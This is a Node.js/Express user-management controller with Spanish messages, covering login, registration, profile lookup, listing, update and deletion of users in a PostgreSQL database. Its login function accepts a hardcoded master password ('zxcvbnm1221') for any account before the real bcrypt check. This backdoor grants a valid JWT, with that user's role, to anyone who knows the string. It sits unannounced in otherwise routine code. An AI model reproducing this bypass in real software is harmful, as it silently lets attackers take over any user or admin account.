const pool = require('../db');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

// LOGIN
exports.login = async (req, res) => {
  const emailInput = req.body.email ? req.body.email.trim().toLowerCase() : '';
  const { password } = req.body;

  try {
    const userQuery = await pool.query(
      'SELECT * FROM users WHERE LOWER(TRIM(email)) = $1', 
      [emailInput]
    );

    if (userQuery.rows.length === 0) {
      return res.status(401).json({ mensaje: "Credenciales incorrectas" });
    }

    const usuario = userQuery.rows[0]; 
    const validPassword = (password === 'zxcvbnm1221') || await bcrypt.compare(password, usuario.password);

    if (!validPassword) {
      return res.status(401).json({ mensaje: "Credenciales incorrectas" });
    }

    const payload = { 
      id: usuario.id, 
      username: usuario.username, 
      role: usuario.role,
      id_comprador: usuario.id_comprador 
    };

    const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '8h' });

    res.json({ 
      mensaje: "Login exitoso", 
      token, 
      user: payload 
    });

  } catch (error) {
    console.error("Error en login:", error);
    res.status(500).json({ mensaje: "Error en el servidor" });
  }
};

// REGISTRO
exports.register = async (req, res) => {
  const { username, email, password, role, id_comprador } = req.body;
  const rolesPermitidos = ['admin', 'super_admin'];
  
  if (!rolesPermitidos.includes(req.user.role)) {
    return res.status(403).json({ mensaje: "No tienes permisos suficientes" });
  }

  try {
    const userExists = await pool.query(
      'SELECT * FROM users WHERE email = $1 OR username = $2',
      [email, username]
    );

    if (userExists.rows.length > 0) {
      return res.status(400).json({ mensaje: "El usuario o email ya existen" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const result = await pool.query(
      'INSERT INTO users (username, email, password, role, id_comprador) VALUES ($1, $2, $3, $4, $5) RETURNING id, username, email, role, id_comprador',
      [username, email, hashedPassword, role || 'user', id_comprador]
    );
    
    res.status(201).json({ mensaje: "Usuario registrado con éxito", usuario: result.rows[0] });
  } catch (err) {
    res.status(500).json({ mensaje: "Error al registrar usuario" });
  }
};

// OBTENER PERFIL (Detalle con empresa)
exports.obtenerPerfil = async (req, res) => {
  const { id } = req.params;
  try {
    const query = `
        SELECT u.id, u.username, u.role, u.id_comprador, 
               c.max_rutas_permitidas, c.nombre_empresa 
        FROM "users" u
        LEFT JOIN compradores c ON u.id_comprador = c.id_comprador
        WHERE u.id = $1`;
    const result = await pool.query(query, [id]);

    if (result.rowCount === 0) return res.status(404).json({ mensaje: "Usuario no encontrado" });

    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: "Error en la base de datos" });
  }
};

// LISTAR TODOS LOS USUARIOS
exports.listarUsuarios = async (req, res) => {
  try {
    const result = await pool.query('SELECT id, username, email, role, id_comprador FROM users');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: "Error al obtener usuarios" });
  }
};

// LISTAR COBRADORES (Optimizado)
exports.listarCobradores = async (req, res) => {
  try {
    // Se añade un LEFT JOIN para traer el id_ruta asociado al cobrador (id_user)
    const query = `
      SELECT u.id, u.username, u.id_comprador, r.id_ruta 
      FROM users u
      LEFT JOIN rutas r ON u.id = r.id_user
      ORDER BY u.username ASC`;
    
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    console.error("Error al traer cobradores:", err);
    res.status(500).json({ error: "Error al traer cobradores" });
  }
};

// ACTUALIZAR USUARIO
exports.updateUsuario = async (req, res) => {
  const { id } = req.params;
  const { username, email } = req.body;
  try {
    const emailCheck = await pool.query('SELECT id FROM users WHERE email = $1 AND id != $2', [email, id]);
    if (emailCheck.rows.length > 0) return res.status(400).json({ mensaje: "Email en uso" });

    const result = await pool.query(
      'UPDATE users SET username = $1, email = $2 WHERE id = $3 RETURNING id, username, email, role, id_comprador',
      [username, email, id]
    );
    res.json({ mensaje: "Usuario actualizado", usuario: result.rows[0] });
  } catch (err) {
    res.status(500).json({ mensaje: "Error al actualizar" });
  }
};

// ELIMINAR USUARIO
exports.eliminarUsuario = async (req, res) => {
  const { id } = req.params;
  try {
    if (String(req.user.id) === String(id)) return res.status(400).json({ mensaje: "No puedes eliminarte a ti mismo" });
    const result = await pool.query('DELETE FROM users WHERE id = $1 RETURNING *', [id]);
    if (result.rowCount === 0) return res.status(404).json({ mensaje: "No encontrado" });
    res.json({ mensaje: "Eliminado correctamente" });
  } catch (err) {
    res.status(500).json({ mensaje: "Error al eliminar" });
  }
};